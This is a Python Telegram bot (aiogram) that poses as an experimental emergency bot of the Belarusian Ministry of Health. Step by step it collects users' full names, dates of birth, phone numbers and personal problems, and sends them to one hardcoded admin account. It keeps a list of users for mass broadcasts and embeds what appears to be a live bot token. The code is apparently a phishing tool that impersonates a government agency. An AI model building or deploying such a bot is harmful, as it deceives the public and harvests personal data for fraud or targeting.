import asyncio
import json
import os
from aiogram import Bot, Dispatcher, types
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# --- Конфіг ---
API_TOKEN = os.getenv("API_TOKEN", "8383126261:AAHV-m1cRtEs8uU0-zMUGo4oRoXsv_o3b0A")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7666912965))  # свій Telegram ID

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# --- Збереження користувачів ---
USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                return set(json.load(f))
        except:
            return set()
    return set()

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(list(all_users), f)

# тимчасові дані
user_data = {}
completed_users = set()
all_users = load_users()  # ✅ завантажуємо користувачів при старті


# --- Команда /start ---
@dp.message(Command("start"))
async def start(message: types.Message):
    uid = message.from_user.id
    all_users.add(uid)
    save_users()  # ✅ зберігаємо у файл

    await message.answer(
        "👋 Вас приветствует <b>экспериментальный бот Министерства здравоохранения Республики Беларусь</b>\n\n"
        "Этот бот создан для <b>быстрого реагирования на экстренные ситуации</b> 🚨\n\n"
        "Пожалуйста, заполните небольшую форму.\n\n"
        "✍️ Укажите ваше <b>ФИО</b>:",
        reply_markup=ReplyKeyboardRemove()
    )
    user_data[uid] = {}
    if uid in completed_users:
        completed_users.remove(uid)


# --- Розсилка ---
@dp.message(Command("broadcast"))
async def broadcast_command(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("✍️ Отправьте сообщение (текст, фото, видео и т.д.), которое хотите разослать всем пользователям.")
    user_data[message.from_user.id] = {"mode": "broadcast"}


# --- Основний обробник ---
@dp.message()
async def form_handler(message: types.Message):
    uid = message.from_user.id

    # --- Якщо адмін у режимі розсилки ---
    if uid == ADMIN_ID and uid in user_data and user_data[uid].get("mode") == "broadcast":
        success, fail = 0, 0
        for user_id in list(all_users):
            try:
                await bot.copy_message(chat_id=user_id, from_chat_id=uid, message_id=message.message_id)
                success += 1
                await asyncio.sleep(0.05)  # ✅ невелика пауза між повідомленнями
            except Exception as e:
                fail += 1
                # якщо користувач заблокував — видаляємо його зі списку
                if "blocked by the user" in str(e):
                    all_users.remove(user_id)
                    save_users()

        await message.answer(f"✅ Рассылка завершена.\nОтправлено: {success}\nОшибки: {fail}")
        user_data.pop(uid, None)
        return

    # --- Нова заявка ---
    if message.text == "📋 Подать новую заявку":
        await message.answer("✍️ Укажите ваше <b>ФИО</b>:", reply_markup=ReplyKeyboardRemove())
        user_data[uid] = {}
        if uid in completed_users:
            completed_users.remove(uid)
        return

    if uid not in user_data:
        return

    # --- Якщо надійшов контакт ---
    if message.contact and "phone" not in user_data[uid]:
        user_data[uid]["phone"] = message.contact.phone_number
        await message.answer("📝 Опишите вашу <b>проблему или вопрос</b>:", reply_markup=ReplyKeyboardRemove())
        return

    # --- Анкета по кроках ---
    if "fio" not in user_data[uid]:
        user_data[uid]["fio"] = message.text
        await message.answer("📅 Укажите вашу <b>дату рождения</b> (ДД.ММ.ГГГГ):")

    elif "dob" not in user_data[uid]:
        user_data[uid]["dob"] = message.text

        contact_keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📱 Поделиться номером", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await message.answer("📱 Нажмите кнопку ниже, чтобы поделиться своим <b>номером телефона</b>:", reply_markup=contact_keyboard)

    elif "phone" not in user_data[uid]:
        await message.answer("⚠️ Пожалуйста, используйте кнопку, чтобы поделиться номером телефона.")

    elif "question" not in user_data[uid]:
        user_data[uid]["question"] = message.text

        text = (
            "📩 <b>Новая заявка!</b>\n\n"
            f"👤 ФИО: {user_data[uid]['fio']}\n"
            f"📅 Дата рождения: {user_data[uid]['dob']}\n"
            f"📱 Телефон: {user_data[uid]['phone']}\n"
            f"📝 Вопрос/Проблема: {user_data[uid]['question']}"
        )

        await bot.send_message(ADMIN_ID, text)

        keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📋 Подать новую заявку")]],
            resize_keyboard=True,
            one_time_keyboard=True
        )

        await message.answer(
            "✅ Ваша заявка успешно принята!\n\n"
            "Наши специалисты уже получили вашу информацию и свяжутся с вами в ближайшее время ⏳\n\n"
            "Спасибо, что обратились в <b>Чат-Бот Минздрава Республики Беларусь</b> 💼",
            reply_markup=keyboard
        )

        user_data.pop(uid)
        completed_users.add(uid)


# --- Запуск ---
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())

